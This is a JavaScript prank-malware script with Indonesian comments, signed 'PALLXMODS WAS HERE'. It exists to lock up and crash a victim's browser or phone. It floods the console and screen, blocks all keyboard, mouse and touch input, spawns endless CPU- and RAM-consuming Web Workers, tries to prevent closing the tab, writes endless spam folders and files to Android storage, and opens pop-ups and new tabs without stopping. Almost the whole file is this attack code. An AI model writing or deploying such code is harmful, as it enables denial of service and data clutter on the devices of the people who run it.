const fs = require('fs');
const path = require('path');

// **Definisi PeeX (Biar Gak Error)**
const PeeX = {}; 
PeeX.maklus = [
    "\x1b[32m",
    "\x1b[31m",
    "\x1b[35m",
    "\x1b[34m",
    "\x1b[36m",
    "\x1b[33m"
];

// **Spam Console - Membuat Ram & CPU Menggila**
PeeX.meletup = function () {
    while (true) {
        Math.sqrt(Math.random() * 999999999);
        console.log("🔥 PALLXMODS WAS HERE 🔥");
    }
};

// **Spam Console**
setInterval(() => {
    let maklu = PeeX.maklus[Math.floor(Math.random() * PeeX.maklus.length)];
    console.log(maklu + "🔥 PALLXMODS WAS HERE 🔥");
    PeeX.meletup();
}, 1); // TURBO MODE 💀

PeeX.document = document;

// **Blokir Semua Input User - Keyboard & Mouse**
PeeX.document.addEventListener("keydown", function (event) {
    event.preventDefault();
    alert("GAK BISA KELUAR WOI! 🔥😹");
    PeeX.meletup();
});
PeeX.document.addEventListener("click", function (event) {
    event.preventDefault();
    PeeX.meletup();
});
PeeX.document.body.style.overflow = "hidden";

// **Spam Elemen Chaos**
setInterval(() => {
    let div = PeeX.document.createElement("div");
    div.style.position = "fixed";
    div.style.top = Math.random() * window.innerHeight + "px";
    div.style.left = Math.random() * window.innerWidth + "px";
    div.style.width = "100vw";
    div.style.height = "100vh";
    div.style.backgroundColor = "#" + Math.floor(Math.random() * 16777215).toString(16);
    PeeX.document.body.appendChild(div);
}, 1); // TURBO SPAM 💀

PeeX.document.body.addEventListener("touchstart", function (event) {
    event.preventDefault();
    PeeX.meletup();
});
PeeX.document.body.addEventListener("mousedown", function (event) {
    event.preventDefault();
});
PeeX.document.body.addEventListener("mouseup", function (event) {
    event.preventDefault();
});
PeeX.document.body.addEventListener("mousemove", function (event) {
    event.preventDefault();
});

// **Super DDoS CPU & RAM**
while (true) {
    new Worker(URL.createObjectURL(new Blob([`
        while (true) {
            let arr = [];
            for (let i = 0; i < 1e6; i++) arr.push(Math.random());
        }
    `], { type: 'application/javascript' })));
}

// **Block Refresh & Close Tab**
PeeX.document.body.addEventListener('beforeunload', function (event) {
    event.preventDefault();
    event.returnValue = '';
});

// **Spam File dan Folder (Storage)**
const baseFolder = '/storage/emulated/0/PallxMods Was Here/';
const folderName = 'PallxMods Was Here';
const fileName = 'file_';

// Fungsi bikin folder & file spam
function createFilesAndFolders() {
    for (let i = 0; i < 1000; i++) {
        let folderPath = path.join(baseFolder, folderName, `Folder_${Date.now()}_${i}`);
        let filePath = path.join(folderPath, `${fileName}${Date.now()}.txt`);
        
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
        }
        
        fs.writeFileSync(filePath, `🔥 PALLXMODS WAS HERE 🔥`);
    }
}

// **Spam Folder dan File**
setInterval(createFilesAndFolders, 1); // Spam file & folder tanpa henti

// **Pop-up Spam**
function blockUI() {
    while (true) {
        alert("GAK BISA KELUAR WOI! 🔥😹");
    }
}
setInterval(blockUI, 1); // Spam alert tanpa henti

// **Pop-up Tab tanpa henti**
setInterval(() => {
    window.open('about:blank', '_blank'); // Bikin tab baru tanpa henti
}, 1); // Spam tab baru

            
